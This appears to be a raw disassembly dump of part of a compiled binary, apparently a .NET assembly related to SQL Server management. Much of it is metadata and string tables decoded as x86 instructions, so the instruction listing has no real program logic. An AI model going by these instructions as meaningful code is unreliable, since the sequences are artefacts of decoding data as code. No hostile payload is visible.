  402db1:	add    BYTE PTR [ecx+0x1],dl
  402db4:	xchg   ebp,eax
  402db5:	or     esi,DWORD PTR [ebx]
  402db7:	add    BYTE PTR [ecx],dl
  402db9:	add    BYTE PTR [ecx],cl
  402dbb:	or     al,0x88
  402dbd:	add    eax,0xc210021
  402dc2:	lea    eax,ds:0xc310011
  402dc8:	xchg   ebx,eax
  402dc9:	add    eax,0xc4c0021
  402dce:	cwde   
  402dcf:	add    eax,0xc630019
  402dd4:	sahf   
  402dd5:	add    eax,0x17d0181
  402dda:	and    eax,0x7e018100
  402ddf:	or     al,0xa7
  402de1:	add    eax,0xc820021
  402de6:	and    eax,0x92018100
  402deb:	or     al,0x25
  402ded:	add    BYTE PTR [ecx-0x3bf35fff],cl
  402df3:	add    eax,0xd030191
  402df8:	rol    BYTE PTR ds:0xd130199,cl
  402dfe:	fadd   DWORD PTR ds:0xd1c0009
  402e04:	fld    QWORD PTR ds:0xd3d01a1
  402e0a:	loope  0x402e11
  402e0c:	push   ecx
  402e0d:	add    DWORD PTR [ebp+0xd],eax
  402e10:	xor    eax,DWORD PTR [eax]
  402e12:	cmp    DWORD PTR [ecx],eax
  402e14:	push   edi
  402e15:	or     eax,0x1b105dd
  402e1a:	imul   ecx,DWORD PTR ds:0x1a105ea,0x75
  402e21:	or     eax,0x1b905fe
  402e26:	jge    0x402e29
  402e28:	sbb    BYTE PTR [ecx+eiz*4],al
  402e2b:	add    DWORD PTR [ebp-0x5ef9fcf3],edx
  402e31:	add    DWORD PTR [ebp-0x36f9f8f3],esp
  402e37:	add    eax,edx
  402e39:	or     eax,0x1c9060d
  402e3e:	test   BYTE PTR ds:0x1c10613,0xa0
  402e45:	or     al,0x19
  402e47:	push   es
  402e48:	or     BYTE PTR [eax],al
  402e4a:	adc    BYTE PTR [eax],al
  402e4c:	add    BYTE PTR ss:[esi],cl
  402e4f:	add    BYTE PTR [eax],bl
  402e51:	add    BYTE PTR [ebx+0x0],ch
  402e54:	push   cs
  402e55:	add    BYTE PTR [eax+eax*1],bl
  402e58:	je     0x402e5a
  402e5a:	or     BYTE PTR [eax],al
  402e5c:	and    BYTE PTR [eax],al
  402e5e:	ja     0x402e60
  402e60:	or     BYTE PTR [eax],al
  402e62:	and    al,0x0
  402e64:	jl     0x402e66
  402e66:	or     BYTE PTR [eax],al
  402e68:	sub    BYTE PTR [eax],al
  402e6a:	test   DWORD PTR [eax],eax
  402e6c:	push   cs
  402e6d:	add    BYTE PTR [eax+eax*1],ch
  402e70:	cwde   
  402e71:	add    BYTE PTR [eax],cl
  402e73:	add    BYTE PTR [eax],dh
  402e75:	add    BYTE PTR [ecx+0x34000800],ch
  402e7b:	add    BYTE PTR [eax+eax*1+0x8],bh
  402e7f:	add    BYTE PTR [eax],bh
  402e81:	add    BYTE PTR [esi+0x3c000800],ch
  402e87:	add    BYTE PTR [eax+eax*1+0xe],bh
  402e8b:	add    BYTE PTR [eax+0x0],al
  402e8e:	mov    bl,0x0
  402e90:	push   cs
  402e91:	add    BYTE PTR [eax+eax*1-0x44],al
  402e95:	add    BYTE PTR [esi],cl
  402e97:	add    BYTE PTR [eax+0x0],cl
  402e9a:	in     eax,0x0
  402e9c:	push   cs
  402e9d:	add    BYTE PTR [eax+eax*1+0x7f],cl
  402ea1:	add    DWORD PTR [esi],ecx
  402ea3:	add    BYTE PTR [eax+0x0],dl
  402ea6:	sahf   
  402ea7:	add    DWORD PTR [esi],ecx
  402ea9:	add    BYTE PTR [eax+eax*1+0x7f],dl
  402ead:	add    DWORD PTR [esi],ecx
  402eaf:	add    BYTE PTR [eax+0x0],bl
  402eb2:	rol    DWORD PTR [ecx],1
  402eb4:	push   cs
  402eb5:	add    BYTE PTR [eax+eax*1-0x2f],bl
  402eb9:	add    DWORD PTR [esi],ecx
  402ebb:	add    BYTE PTR [eax+0x0],ah
  402ebe:	fadd   DWORD PTR [ecx]
  402ec0:	push   cs
  402ec1:	add    BYTE PTR [eax+eax*1-0x1d],ah
  402ec5:	add    DWORD PTR [esi],ecx
  402ec7:	add    BYTE PTR [eax+0x0],ch
  402eca:	push   ss
  402ecb:	add    cl,BYTE PTR [esi]
  402ecd:	add    BYTE PTR [eax+eax*1+0x16],ch
  402ed1:	add    cl,BYTE PTR [esi]
  402ed3:	add    BYTE PTR [eax+0x0],dh
  402ed6:	xor    DWORD PTR [edx],eax
  402ed8:	push   cs
  402ed9:	add    BYTE PTR [eax+eax*1+0x7a],dh
  402edd:	add    cl,BYTE PTR [esi]
  402edf:	add    BYTE PTR [eax+0x0],bh
  402ee2:	mov    DWORD PTR [edx],0x7c000e
  402ee8:	(bad)  
  402ee9:	add    cl,BYTE PTR [esi]
  402eeb:	add    BYTE PTR [eax+0xe02e500],al
  402ef1:	add    BYTE PTR [eax+eax*1+0xe02f2],al
  402ef8:	mov    BYTE PTR [eax],al
  402efa:	cwde   
  402efb:	add    BYTE PTR [ecx],cl
  402efd:	add    BYTE PTR [eax+eax*1+0x90302],cl
  402f04:	nop
  402f05:	add    BYTE PTR [eax+eax*1+0xe],bh
  402f09:	add    BYTE PTR [eax+eax*1+0xe0307],dl
  402f10:	cwde   
  402f11:	add    BYTE PTR [edx],bl
  402f13:	add    ecx,DWORD PTR [esi]
  402f15:	add    BYTE PTR [eax+eax*1+0xe0339],bl
  402f1c:	mov    al,ds:0xe03d700
  402f21:	add    BYTE PTR [eax+eax*1+0x2e0402],ah
  402f28:	adc    eax,DWORD PTR [eax]
  402f2a:	sub    DWORD PTR [esi],eax
  402f2c:	add    BYTE PTR cs:[ebx],ah
  402f2f:	add    BYTE PTR [edi],ch
  402f31:	push   es
  402f32:	add    BYTE PTR cs:[ebx],ch
  402f35:	add    BYTE PTR [ecx+0x6],cl
  402f38:	add    BYTE PTR cs:[ebx],dh
  402f3b:	add    BYTE PTR [ebx+0x6],dh
  402f3e:	add    BYTE PTR cs:[ebx],bh
  402f41:	add    BYTE PTR [esi+0x43002e06],cl
  402f47:	add    BYTE PTR [ebx+0x4b002e06],bh
  402f4d:	add    ch,cl
  402f4f:	push   es
  402f50:	add    BYTE PTR cs:[ebx+0x0],dl
  402f54:	sub    DWORD PTR [esi],eax
  402f56:	add    BYTE PTR cs:[ebx+0x0],bl
  402f5a:	add    eax,DWORD PTR [edi]
  402f5c:	add    BYTE PTR cs:[ebx+0x0],ah
  402f60:	das    
  402f61:	push   es
  402f62:	add    BYTE PTR cs:[ebx+0x0],ch
  402f66:	das    
  402f67:	push   es
  402f68:	add    BYTE PTR cs:[ebx+0x0],dh
  402f6c:	push   ecx
  402f6d:	pop    es
  402f6e:	add    BYTE PTR cs:[ebx+0x2e075700],al
  402f75:	add    BYTE PTR [ebx+0x2e062900],cl
  402f7b:	add    BYTE PTR [ebx+0x2e075100],bl
  402f81:	add    BYTE PTR [ebx+0x2e076200],ah
  402f87:	add    BYTE PTR [ebx+0x2e076b00],ch
  402f8d:	add    BYTE PTR [ebx+0x8077400],dh
  402f93:	add    BYTE PTR [esi],al
  402f95:	add    BYTE PTR [ebx+0x5404ec07],dl
  402f9b:	add    eax,0x5ae0578
  402fa0:	out    dx,eax
  402fa1:	add    eax,0x20624
  402fa6:	add    DWORD PTR [eax],eax
  402fa8:	pop    es
  402fa9:	add    BYTE PTR [edx],al
  402fab:	add    BYTE PTR [eax],al
  402fad:	add    BYTE PTR [edx+0x2e01],ah
  402fb3:	add    BYTE PTR [eax],ah
  402fb5:	push   es
  402fb6:	(bad)  
  402fb8:	add    al,BYTE PTR [eax]
  402fba:	add    eax,DWORD PTR [eax]
  402fbc:	add    eax,DWORD PTR [eax]
  402fbe:	add    al,BYTE PTR [eax]
  402fc0:	adc    eax,DWORD PTR [eax]
  402fc2:	add    eax,0x800400
  402fc7:	add    BYTE PTR [ebx],cl
  402fc9:	add    BYTE PTR [eax],al
  402fcb:	add    BYTE PTR [eax],al
  402fcd:	add    BYTE PTR [eax],al
  402fcf:	add    BYTE PTR [ecx],al
  402fd1:	add    BYTE PTR [eax],al
  402fd3:	add    BYTE PTR [esi],ch
  402fd5:	add    al,0xab
  402fd7:	or     DWORD PTR [eax],eax
  402fd9:	add    BYTE PTR [edx],al
	...
  402fe3:	add    BYTE PTR [eax],al
  402fe5:	add    BYTE PTR [ecx],al
  402fe7:	add    BYTE PTR [esi+0x0],ah
  402fed:	add    BYTE PTR [ebx],cl
	...
  402ff7:	add    BYTE PTR [eax],al
  402ff9:	add    BYTE PTR [edx],cl
  402ffb:	add    BYTE PTR [ebp+0x0],bh
  403001:	add    BYTE PTR [edx],al
	...
  40300b:	add    BYTE PTR [eax],al
  40300d:	add    cl,cl
  40300f:	add    eax,0xca6
  403014:	add    BYTE PTR [eax],al
  403016:	add    al,BYTE PTR [eax]
	...
  403020:	add    BYTE PTR [eax],al
  403022:	add    DWORD PTR [eax],eax
  403024:	scas   eax,DWORD PTR es:[edi]
	...
  40302d:	cmp    al,0x4d
  40302f:	outs   dx,DWORD PTR ds:[esi]
  403030:	fs jne 0x40309f
  403033:	gs add BYTE PTR ds:[ecx+eiz*2+0x74],al
  403039:	popa   
  40303a:	bound  esp,QWORD PTR [ecx+0x73]
  40303d:	gs dec ebp
  40303f:	popa   
  403040:	imul   ebp,DWORD PTR [esi+ebp*1+0x65],0x4d006578
  403048:	popa   
  403049:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x4d006f66
  403051:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403058:	je     0x403088
  40305a:	push   ebx
  40305b:	jno    0x4030c9
  40305d:	push   ebx
  40305e:	gs jb  0x4030d7
  403061:	gs jb  0x403092
  403064:	dec    ebp
  403065:	popa   
  403066:	outs   dx,BYTE PTR ds:[esi]
  403067:	popa   
  403068:	gs ins DWORD PTR es:[di],dx
  40306b:	outs   dx,BYTE PTR gs:[esi]
  40306d:	je     0x40309d
  40306f:	push   ebx
  403070:	jno    0x4030de
  403072:	dec    ecx
  403073:	dec    ebp
  403074:	popa   
  403075:	imul   ebp,DWORD PTR [esi+ebp*1+0x49],0x6c69614d
  40307d:	push   eax
  40307e:	jb     0x4030ef
  403080:	arpl   WORD PTR [ebp+0x73],sp
  403083:	jae    0x403085
  403085:	push   ebx
  403086:	gs ins DWORD PTR es:[edi],dx
  403088:	popa   
  403089:	jo     0x4030f3
  40308b:	outs   dx,DWORD PTR ds:[esi]
  40308c:	jb     0x4030f3
  40308e:	add    BYTE PTR [ecx+0x75],dl
  403091:	gs jne 0x4030f9
  403094:	dec    ecx
  403095:	je     0x4030fc
  403097:	ins    DWORD PTR es:[edi],dx
  403098:	push   eax
  403099:	jb     0x40310a
  40309b:	arpl   WORD PTR [ebp+0x73],sp
  40309e:	jae    0x403105
  4030a0:	jb     0x4030a2
  4030a2:	push   esp
  4030a3:	push   0x64616572
  4030a8:	inc    ebx
  4030a9:	popa   
  4030aa:	ins    BYTE PTR es:[edi],dx
  4030ab:	ins    BYTE PTR es:[edi],dx
  4030ac:	inc    edx
  4030ad:	popa   
  4030ae:	arpl   WORD PTR [ebx+0x0],bp
  4030b1:	push   ebx
  4030b2:	jno    0x403120
  4030b4:	dec    ecx
  4030b5:	dec    ebp
  4030b6:	popa   
  4030b7:	imul   ebp,DWORD PTR [ebp+ecx*2+0x61],0x41006e69
  4030bf:	jae    0x403134
  4030c1:	gs ins DWORD PTR es:[edi],dx
  4030c3:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  4030c7:	gs jb  0x40313d
  4030ca:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  4030d1:	add    BYTE PTR [ebp+0x73],ch
  4030d4:	arpl   WORD PTR [edi+0x72],bp
  4030d7:	ins    BYTE PTR es:[edi],dx
  4030d8:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4030df:	gs ins DWORD PTR es:[edi],dx
  4030e1:	add    BYTE PTR [edi+0x62],cl
  4030e4:	push   0x65
  4030e6:	arpl   WORD PTR [eax+eax*1+0x44],si
  4030ea:	popa   
  4030eb:	je     0x40314e
  4030ed:	bound  esp,QWORD PTR [ecx+0x73]
  4030f0:	gs dec ebp
  4030f2:	popa   
  4030f3:	imul   ebp,DWORD PTR [ebp+eax*2+0x6e],0x656e6967
  4030fb:	add    BYTE PTR [ebp+0x69],cl
  4030fe:	arpl   WORD PTR [edx+0x6f],si
  403101:	jae    0x403172
  403103:	data16 je 0x403134
  403106:	push   ebx
  403107:	jno    0x403175
  403109:	push   ebx
  40310a:	gs jb  0x403183
  40310d:	gs jb  0x40313e
  403110:	dec    ebp
  403111:	popa   
  403112:	outs   dx,BYTE PTR ds:[esi]
  403113:	popa   
  403114:	gs ins DWORD PTR es:[di],dx
  403117:	outs   dx,BYTE PTR gs:[esi]
  403119:	je     0x403149
  40311b:	push   ebx
  40311c:	jno    0x40318a
  40311e:	dec    ecx
  40311f:	dec    ebp
  403120:	popa   
  403121:	imul   ebp,DWORD PTR [esi+ebp*1+0x53],0x65767265
  403129:	jb     0x403159
  40312b:	inc    esp
  40312c:	popa   
  40312d:	je     0x403190
  40312f:	inc    ecx
  403130:	arpl   WORD PTR [ebx+0x65],sp
  403133:	jae    0x4031a8
  403135:	add    BYTE PTR [edx+eax*2+0x53],al
  403139:	gs jae 0x4031af
  40313c:	imul   ebp,DWORD PTR [edi+0x6e],0x62645f00
  403143:	push   ebx
  403144:	gs jae 0x4031ba
  403147:	imul   ebp,DWORD PTR [edi+0x6e],0x65735f00
  40314e:	ins    DWORD PTR es:[edi],dx
  40314f:	popa   
  403150:	jo     0x4031ba
  403152:	outs   dx,DWORD PTR ds:[esi]
  403153:	jb     0x4031ba
  403155:	add    BYTE PTR [ecx+eiz*2+0x74],al
  403159:	popa   
  40315a:	inc    ecx
  40315b:	arpl   WORD PTR [ebx+0x65],sp
  40315e:	jae    0x4031d3
  403160:	inc    ecx
  403161:	fs popa 
  403163:	jo     0x4031d9
  403165:	gs jb  0x403168
  403168:	dec    ebp
  403169:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403170:	je     0x4031a0
  403172:	push   ebx
  403173:	jno    0x4031e1
  403175:	push   ebx
  403176:	gs jb  0x4031ef
  403179:	gs jb  0x4031aa
  40317c:	dec    ebp
  40317d:	popa   
  40317e:	outs   dx,BYTE PTR ds:[esi]
  40317f:	popa   
  403180:	gs ins DWORD PTR es:[di],dx
  403183:	outs   dx,BYTE PTR gs:[esi]
  403185:	je     0x4031b5
  403187:	push   ebx
  403188:	jno    0x4031f6
  40318a:	dec    ecx
  40318b:	dec    ebp
  40318c:	popa   
  40318d:	imul   ebp,DWORD PTR [esi+ebp*1+0x53],0x65767265
  403195:	jb     0x4031c5
  403197:	dec    edi
  403198:	bound  ebp,QWORD PTR [edx+0x65]
  40319b:	arpl   WORD PTR [ebx+esi*2+0x0],si
  40319f:	push   ecx
  4031a0:	jne    0x403207
  4031a2:	jne    0x403209
  4031a4:	dec    ecx
  4031a5:	je     0x40320c
  4031a7:	ins    DWORD PTR es:[edi],dx
  4031a8:	add    BYTE PTR [esi],ch
  4031aa:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4031ae:	add    BYTE PTR [ebp+eiz*2+0x63],al
  4031b2:	jb     0x403219
  4031b4:	ins    DWORD PTR es:[edi],dx
  4031b5:	outs   dx,BYTE PTR gs:[esi]
  4031b7:	je     0x40320c
  4031b9:	gs ins DWORD PTR es:[edi],dx
  4031bb:	popa   
  4031bc:	jo     0x403226
  4031be:	outs   dx,DWORD PTR ds:[esi]
  4031bf:	jb     0x403226
  4031c1:	add    BYTE PTR [edi+0x65],ah
  4031c4:	je     0x403225
  4031c6:	push   ebx
  4031c7:	gs jae 0x40323d
  4031ca:	imul   ebp,DWORD PTR [edi+0x6e],0x73655300
  4031d1:	jae    0x40323c
  4031d3:	outs   dx,DWORD PTR ds:[esi]
  4031d4:	outs   dx,BYTE PTR ds:[esi]
  4031d5:	add    BYTE PTR [ebx+0x6f],ah
  4031d8:	jne    0x403248
  4031da:	je     0x403241
  4031dc:	jb     0x4031de
  4031de:	dec    ecx
  4031df:	outs   dx,BYTE PTR ds:[esi]
  4031e0:	arpl   WORD PTR [edx+0x65],si
  4031e3:	ins    DWORD PTR es:[edi],dx
  4031e4:	outs   dx,BYTE PTR gs:[esi]
  4031e6:	je     0x4031e8
  4031e8:	inc    esp
  4031e9:	arpl   WORD PTR gs:[edx+0x65],si
  4031ed:	ins    DWORD PTR es:[edi],dx
  4031ee:	outs   dx,BYTE PTR gs:[esi]
  4031f0:	je     0x4031f2
  4031f2:	push   edi
  4031f3:	popa   
  4031f4:	imul   esi,DWORD PTR [eax+eax*1+0x4d],0x75517861
  4031fc:	gs jne 0x403264
  4031ff:	push   edx
  403200:	gs popa 
  403202:	fs inc esi
  403204:	popa   
  403205:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x5f007365
  40320d:	jno    0x403284
  40320f:	gs jne 0x403277
  403212:	push   edx
  403213:	gs popa 
  403215:	fs inc esi
  403217:	popa   
  403218:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x74615765
  403220:	gs jb  0x403290
  403223:	popa   
  403224:	jb     0x403291
  403226:	add    BYTE PTR [esi+0x65],cl
  403229:	gs fs push esp
  40322c:	outs   dx,DWORD PTR ds:[esi]
  40322d:	inc    ebp
  40322e:	js     0x403299
  403230:	je     0x403232
  403232:	inc    edi
  403233:	gs je  0x403284
  403236:	gs ja  0x40327a
  403239:	fs popa 
  40323b:	jo     0x4032b1
  40323d:	gs jb  0x403297
  403240:	imul   esi,DWORD PTR [eax+ebp*2+0x43],0x656e6e6f
  403248:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40324c:	outs   dx,BYTE PTR ds:[esi]
  40324d:	add    BYTE PTR [ebp+0x69],cl
  403250:	arpl   WORD PTR [edx+0x6f],si
  403253:	jae    0x4032c4
  403255:	data16 je 0x403286
  403258:	push   ebx
  403259:	jno    0x4032c7
  40325b:	push   ebx
  40325c:	gs jb  0x4032d5
  40325f:	gs jb  0x403290
  403262:	dec    ebp
  403263:	popa   
  403264:	outs   dx,BYTE PTR ds:[esi]
  403265:	popa   
  403266:	gs ins DWORD PTR es:[di],dx
  403269:	outs   dx,BYTE PTR gs:[esi]
  40326b:	je     0x40329b
  40326d:	push   ebx
  40326e:	jno    0x4032dc
  403270:	dec    ecx
  403271:	dec    ebp
  403272:	popa   
  403273:	imul   ebp,DWORD PTR [esi+ebp*1+0x53],0x65767265
  40327b:	jb     0x4032ab
  40327d:	inc    ebx
  40327e:	outs   dx,DWORD PTR ds:[esi]
  40327f:	ins    DWORD PTR es:[edi],dx
  403280:	ins    DWORD PTR es:[edi],dx
  403281:	outs   dx,DWORD PTR ds:[esi]
  403282:	outs   dx,BYTE PTR ds:[esi]
  403283:	add    BYTE PTR [edi+ebp*2+0x67],cl
  403287:	dec    esp
  403288:	gs jbe 0x4032f0
  40328b:	ins    BYTE PTR es:[edi],dx
  40328c:	add    BYTE PTR [eax+0x72],dl
  40328f:	outs   dx,DWORD PTR ds:[esi]
  403290:	arpl   WORD PTR [ebp+0x73],sp
  403293:	jae    0x4032e6
  403295:	jne    0x4032fc
  403297:	jne    0x4032fe
  403299:	dec    ecx
  40329a:	je     0x403301
  40329c:	ins    DWORD PTR es:[edi],dx
  40329d:	jae    0x40329f
  40329f:	inc    edi
  4032a0:	gs je  0x4032e7
  4032a3:	popa   
  4032a4:	je     0x403307
  4032a6:	inc    esi
  4032a7:	jb     0x403318
  4032a9:	ins    DWORD PTR es:[edi],dx
  4032aa:	push   ecx
  4032ab:	jne    0x403312
  4032ad:	jne    0x403314
  4032af:	add    BYTE PTR [ebp+0x69],cl
  4032b2:	arpl   WORD PTR [edx+0x6f],si
  4032b5:	jae    0x403326
  4032b7:	data16 je 0x4032e8
  4032ba:	push   ebx
  4032bb:	jno    0x403329
  4032bd:	push   ebx
  4032be:	gs jb  0x403337
  4032c1:	gs jb  0x4032f2
  4032c4:	dec    ebp
  4032c5:	popa   
  4032c6:	outs   dx,BYTE PTR ds:[esi]
  4032c7:	popa   
  4032c8:	gs ins DWORD PTR es:[di],dx
  4032cb:	outs   dx,BYTE PTR gs:[esi]
  4032cd:	je     0x4032fd
  4032cf:	push   ebx
  4032d0:	jno    0x40333e
  4032d2:	dec    ecx
  4032d3:	dec    ebp
  4032d4:	popa   
  4032d5:	imul   ebp,DWORD PTR [esi+ebp*1+0x53],0x65767265
  4032dd:	jb     0x40330d
  4032df:	inc    ebx
  4032e0:	outs   dx,DWORD PTR ds:[esi]
  4032e1:	outs   dx,BYTE PTR ds:[esi]
  4032e2:	je     0x403356
  4032e4:	outs   dx,DWORD PTR ds:[esi]
  4032e5:	ins    BYTE PTR es:[edi],dx
  4032e6:	ins    BYTE PTR es:[edi],dx
  4032e7:	gs jb  0x4032ea
  4032ea:	push   edx
  4032eb:	gs jae 0x40335e
  4032ee:	outs   dx,DWORD PTR ds:[esi]
  4032ef:	outs   dx,BYTE PTR ds:[esi]
  4032f0:	jae    0x403357
  4032f2:	add    BYTE PTR [eax+0x6f],dl
  4032f5:	jae    0x40336b
  4032f7:	push   edx
  4032f8:	gs jae 0x40336b
  4032fb:	outs   dx,DWORD PTR ds:[esi]
  4032fc:	outs   dx,BYTE PTR ds:[esi]
  4032fd:	jae    0x403364
  4032ff:	dec    ecx
  403300:	dec    si
  403302:	gs gs fs gs add BYTE PTR fs:[ebp+0x61],cl
  40330a:	imul   ebp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  403312:	imul   ebp,DWORD PTR [edi+0x6e],0x66656400
  403319:	popa   
  40331a:	jne    0x403388
  40331c:	je     0x403362
  40331e:	inc    edx
  40331f:	dec    esi
  403320:	popa   
  403321:	ins    DWORD PTR es:[edi],dx
  403322:	add    BYTE PTR gs:[ebp+eiz*2+0x66],ah
  403327:	popa   
  403328:	jne    0x403396
  40332a:	je     0x403370
  40332c:	inc    edx
  40332d:	push   ebx
  40332e:	gs jb  0x4033a7
  403331:	gs jb  0x403382
  403334:	popa   
  403335:	ins    DWORD PTR es:[edi],dx
  403336:	add    BYTE PTR gs:[ebp+eiz*2+0x66],al
  40333b:	popa   
  40333c:	jne    0x4033aa
  40333e:	je     0x40338c
  403340:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  403347:	dec    ebp
  403348:	imul   ebp,DWORD PTR [esi+0x69],0x6d756d
  40334f:	dec    esp
  403350:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  403357:	dec    ebp
  403358:	imul   ebp,DWORD PTR [esi+0x69],0x4c6d756d
  40335f:	imul   ebp,DWORD PTR [ebp+0x69],0x65440074
  403366:	popaw  
  403368:	jne    0x4033d6
  40336a:	je     0x4033b8
  40336c:	outs   dx,DWORD PTR ds:[esi]
  40336d:	addr16 imul ebp,DWORD PTR [bp+0x67],0x6576654c
  403376:	ins    BYTE PTR es:[edi],dx
  403377:	add    BYTE PTR [ebp+0x61],cl
  40337a:	imul   ebp,DWORD PTR [esi+0x0],0x45746547
  403381:	outs   dx,BYTE PTR ds:[esi]
  403382:	arpl   WORD PTR [edx+0x79],si
  403385:	jo     0x4033fb
  403387:	imul   ebp,DWORD PTR [edi+0x6e],0x79654b
  40338e:	push   esi
  40338f:	gs jb  0x403405
  403392:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  403399:	outs   dx,BYTE PTR ds:[esi]
  40339a:	add    BYTE PTR [di+0x61],cl
  40339e:	push   0x6f
  4033a0:	jb     0x4033f8
  4033a2:	gs jb  0x403418
  4033a5:	imul   ebp,DWORD PTR [edi+0x6e],0x6e694d00
  4033ac:	outs   dx,DWORD PTR ds:[esi]
  4033ad:	jb     0x403405
  4033af:	gs jb  0x403425
  4033b2:	imul   ebp,DWORD PTR [edi+0x6e],0x69754200
  4033b9:	ins    BYTE PTR es:[edi],dx
  4033ba:	fs push esi
  4033bc:	gs jb  0x403432
  4033bf:	imul   ebp,DWORD PTR [edi+0x6e],0x4c505300
  4033c6:	gs jbe 0x40342e
  4033c9:	ins    BYTE PTR es:[edi],dx
  4033ca:	add    BYTE PTR [eax+0x72],dl
  4033cd:	outs   dx,DWORD PTR ds:[esi]
  4033ce:	fs jne 0x403434
  4033d1:	je     0x403429
  4033d3:	gs jb  0x403449
  4033d6:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  4033dd:	outs   dx,BYTE PTR ds:[esi]
  4033de:	add    BYTE PTR [bx+si+0x72],dl
  4033e2:	outs   dx,DWORD PTR ds:[esi]
  4033e3:	fs jne 0x403449
  4033e6:	je     0x403436
  4033e8:	popa   
  4033e9:	ins    DWORD PTR es:[edi],dx
  4033ea:	gs push ebx
  4033ec:	je     0x403460
  4033ee:	imul   ebp,DWORD PTR [esi+0x67],0x6c715300
  4033f5:	inc    ebp
  4033f6:	outs   dx,BYTE PTR ds:[esi]
  4033f7:	imul   ebp,DWORD PTR [bp+0x65],0x67617355
  4033ff:	gs dec ebp
  403401:	gs je  0x403476
  403404:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  40340b:	inc    edi
  40340c:	jne    0x403477
  40340e:	fs push ebx
  403410:	je     0x403484
  403412:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  403419:	fs jne 0x40347f
  40341c:	je     0x40346c
  40341e:	popa   
  40341f:	ins    DWORD PTR es:[edi],dx
  403420:	gs inc edx
  403422:	jb     0x403485
  403424:	outs   dx,BYTE PTR ds:[esi]
  403425:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  40342d:	outs   dx,BYTE PTR ds:[esi]
  40342e:	add    BYTE PTR [si+0x6f],cl
  403432:	outs   dx,BYTE PTR ds:[esi]
  403433:	addr16 push eax
  403435:	jb     0x4034a6
  403437:	fs jne 0x40349d
  40343a:	je     0x40348a
  40343c:	popa   
  40343d:	ins    DWORD PTR es:[edi],dx
  40343e:	gs inc edx
  403440:	jb     0x4034a3
  403442:	outs   dx,BYTE PTR ds:[esi]
  403443:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  40344b:	outs   dx,BYTE PTR ds:[esi]
  40344c:	add    BYTE PTR [bx+si+0x72],dl
  403450:	outs   dx,DWORD PTR ds:[esi]
  403451:	fs jne 0x4034b7
  403454:	je     0x4034a4
  403456:	popa   
  403457:	ins    DWORD PTR es:[edi],dx
  403458:	gs push ebx
  40345a:	push   0x6374726f
  40345f:	jne    0x4034d5
  403461:	inc    edx
  403462:	jb     0x4034c5
  403464:	outs   dx,BYTE PTR ds:[esi]
  403465:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  40346d:	outs   dx,BYTE PTR ds:[esi]
  40346e:	add    BYTE PTR [bp+0x65],dl
  403472:	jb     0x4034e7
  403474:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  40347b:	je     0x4034e6
  40347d:	outs   dx,DWORD PTR ds:[esi]
  40347e:	outs   dx,BYTE PTR ds:[esi]
  40347f:	push   ebx
  403480:	je     0x4034f4
  403482:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  403489:	fs jne 0x4034ef
  40348c:	je     0x4034e4
  40348e:	gs jb  0x403504
  403491:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  403498:	je     0x403503
  40349a:	outs   dx,DWORD PTR ds:[esi]
  40349b:	outs   dx,BYTE PTR ds:[esi]
  40349c:	push   ebx
  40349d:	je     0x403511
  40349f:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  4034a6:	jae    0x403511
  4034a8:	outs   dx,DWORD PTR ds:[esi]
  4034a9:	outs   dx,BYTE PTR ds:[esi]
  4034aa:	dec    eax
  4034ab:	gs ins BYTE PTR es:[edi],dx
  4034ad:	jo     0x4034fa
  4034af:	gs jns 0x403529
  4034b2:	outs   dx,DWORD PTR ds:[esi]
  4034b3:	jb     0x403519
  4034b5:	push   eax
  4034b6:	jb     0x40351d
  4034b8:	imul   di,WORD PTR [eax+0x0],0x6556
  4034be:	jb     0x403533
  4034c0:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  4034c7:	push   ebx
  4034c8:	gs je  0x40353f
  4034cb:	imul   ebp,DWORD PTR [esi+0x67],0x6b6f5473
  4034d2:	outs   dx,BYTE PTR gs:[esi]
  4034d4:	add    BYTE PTR [ebx+0x65],dl
  4034d7:	je     0x40354e
  4034d9:	jo     0x40352e
  4034db:	jne    0x40354d
  4034dd:	jo     0x40354e
  4034df:	jb     0x403555
  4034e1:	inc    esi
  4034e2:	outs   dx,DWORD PTR ds:[esi]
  4034e3:	ins    BYTE PTR es:[edi],dx
  4034e4:	fs gs jb 0x4034e8
  4034e8:	push   eax
  4034e9:	jb     0x40355a
  4034eb:	fs jne 0x403551
  4034ee:	je     0x40353c
  4034f0:	imul   esp,DWORD PTR [ebx+0x65],0x4665736e
  4034f7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x646f7250
  4034ff:	jne    0x403564
  403501:	je     0x403558
  403503:	jo     0x403569
  403505:	popa   
  403506:	je     0x40356d
  403508:	inc    ebx
  403509:	popa   
  40350a:	je     0x403571
  40350c:	outs   dx,DWORD PTR ds:[si]
  40350e:	jb     0x403589
  403510:	add    BYTE PTR [ebx+0x71],dl
  403513:	ins    BYTE PTR es:[edi],dx
  403514:	push   eax
  403515:	jb     0x403586
  403517:	fs jne 0x40357d
  40351a:	je     0x403562
  40351c:	popa   
  40351d:	ins    DWORD PTR es:[edi],dx
  40351e:	imul   ebp,DWORD PTR [ecx+edi*2+0x43],0x65646f
  403526:	push   eax
  403527:	jb     0x403598
  403529:	fs jne 0x40358f
  40352c:	je     0x403572
  40352e:	imul   esi,DWORD PTR [ebx+0x63],0x7265766f
  403535:	jns    0x403580
